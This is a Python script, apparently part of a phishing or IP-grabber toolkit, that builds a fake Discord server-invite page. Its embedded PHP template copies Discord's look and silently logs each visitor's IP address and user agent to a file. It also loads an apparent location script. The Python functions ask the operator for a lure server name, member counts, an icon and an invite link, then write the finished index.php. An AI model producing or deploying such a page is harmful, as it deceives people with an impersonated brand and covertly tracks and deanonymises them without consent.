import datetime
import shutil
import sys
import random

class COLORS:
    cyan = '\033[96m'
    red = '\033[91m'
    white = '\033[0;97m'
    gray = '\033[90m'

def now():
    now = datetime.datetime.now().strftime("%H:%M:%S")
    return now

s3index = """<?php
function getip()
{
    $ip = null;
    if(isset($_SERVER))
    {
        if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        }
        elseif(isset($_SERVER['HTTP_CLIENT_IP']))
        {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        }
        else
        {
            $ip = $_SERVER['REMOTE_ADDR'];
        }
    }
    else
    {
        if(getenv('HTTP_X_FORWARDED_FOR'))
        {
            $ip = getenv('HTTP_X_FORWARDED_FOR');
        }
        elseif(getenv('HTTP_CLIENT_IP'))
        {
            $ip = getenv('HTTP_CLIENT_IP');
        }
        else
        {
            $ip = getenv('REMOTE_ADDR');
        }
    }
    return $ip;
}
function getagent()
{ 
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    return $useragent;
}
$ip = getip();
$agent = getagent();
$out = array(
    'status' => 'ip_info',
    'ip' => $ip,
    'agent' => $agent
);
$jsondata = json_encode($out);
file_put_contents("files/info/out.txt", $jsondata);
?>
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Discord</title>
        <link href="https://fonts.cdnfonts.com/css/whitney-2" rel="stylesheet">
        <link rel="shortcut icon" href="/files/images/dwq2dD21ce1.ico" type="image/x-icon">
    </head>
    <body style="margin: 0;overflow: hidden;background: #36393f">
        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
        <script src="/files/js/loc.js"></script>
        <div style="height: 132vh;">
            <div style="background: url(data:image/png;base64,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) no-repeat;width: 130px;position: absolute;top: 20px;height: 36px;left: 50%;transform: translate(-50%);"></div>
            <div style="width: 100%;height: 322.5px;position: relative;left: 50%;top: 30%;transform: translate(-50%,-55%);">
                <div style="border-radius: 5px;background: #36393f;padding: 15px;height: 258.5px;">
                    <div style="height: 64px;width: 64px;margin-bottom: 24px;border-radius: 16px;position: relative;left: 50%;transform: translate(-50%);background-image: url(/files/icons/$SICON$);background-size: cover;"></div>
                    <div style="font-family: whitney book;font-size: 16px;line-height: 20px;text-align: center;color: #b9bbbe;">$UNAME$ invited you to join</div>
                    <h1 style="font-family: whitney;font-weight: 600;margin-top: 8px;font-size: 25px;text-align: center;color: #ffffff;margin-bottom: 0;">$SNAME$</h1>
                    <div style="margin-top: 8px;text-align: center;display: flex;flex: 1 1 auto;flex-direction: row;align-items: stretch;flex-wrap: nowrap;justify-content: center;">
                        <div style="margin-right: 16px;display: flex;align-items: center;text-align: center;">
                            <i style="display: inline-block;width: 10px;height: 10px;border-radius: 50%;margin-right: 4px;background: #3ba55d;"></i>
                            <span style="font-size: 16px;color: #b9bbbe;line-height: 18px;font-weight: 400;font-family: whitney book;">$ONL$ Online</span>
                        </div>
                        <div style="display: flex;align-items: center;text-align: center;">
                            <i style="display: inline-block;width: 10px;height: 10px;border-radius: 50%;margin-right: 4px;background: #b9bbbe;"></i>
                            <span style="font-size: 16px;color: #b9bbbe;line-height: 18px;font-weight: 400;font-family: whitney book;">$MEM$ Members</span>
                        </div>
                    </div>
                    <button onclick='window.location.href = "$SLINK$"' style="background: #5865f2;font-size: 16px;line-height: 24px;margin-top: 40px;width: 100%;font-family: whitney;padding: 2px 16px;border: none;border-radius: 3px;height: 44px;color: #ffffff;cursor: pointer;">Accept Invite</button>
                </div>
            </div>
        </div>        
    </body>
</html>"""

def s4file(sname,slink,uname,onl,mem,sicon):
    print("")
    print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]: Generating index.php file.")
    tempindex = s3index
    tempindex = tempindex.replace("$SNAME$", sname)
    tempindex = tempindex.replace("$SLINK$", slink)
    tempindex = tempindex.replace("$UNAME$", uname)
    tempindex = tempindex.replace("$ONL$", onl)
    tempindex = tempindex.replace("$MEM$", mem)
    tempindex = tempindex.replace("$SICON$", sicon)
    with open("site/index.php", "w") as index:
        index.write(tempindex)
    print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]: The index.php is Generated successfully.")

def s4setup():
    slink = input(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.red}INVITE LINK{COLORS.white}]> ")
    sname = input(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.red}SERVER NAME{COLORS.white}]> ")
    uname = input(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.red}USER NAME{COLORS.white}]> ")
    onl = input(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.red}ONLINE MEMBERS{COLORS.white}]> ")
    mem = input(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.red}SERVER MEMBERS{COLORS.white}]> ")
    sicon_ = input(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.red}SERVER IMAGE{COLORS.white}]> ").replace("\"","")
    siconext = sicon_.split('.')[-1]
    iconname= ""
    chars = "qwertyuiopasdfghjklzxcvbnm1234567890"
    for i in range(15):
        iconname += random.choice(chars)
    try:
        shutil.copyfile(sicon_,f"site/files/icons/{iconname}.{siconext}")
    except:
        sys.exit(f"[{COLORS.cyan}{now()}{COLORS.white}] {COLORS.red}Error File Not Found '{sicon_}'{COLORS.white}")
    sicon = iconname+"."+siconext
    s4file(sname,slink,uname,onl,mem,sicon)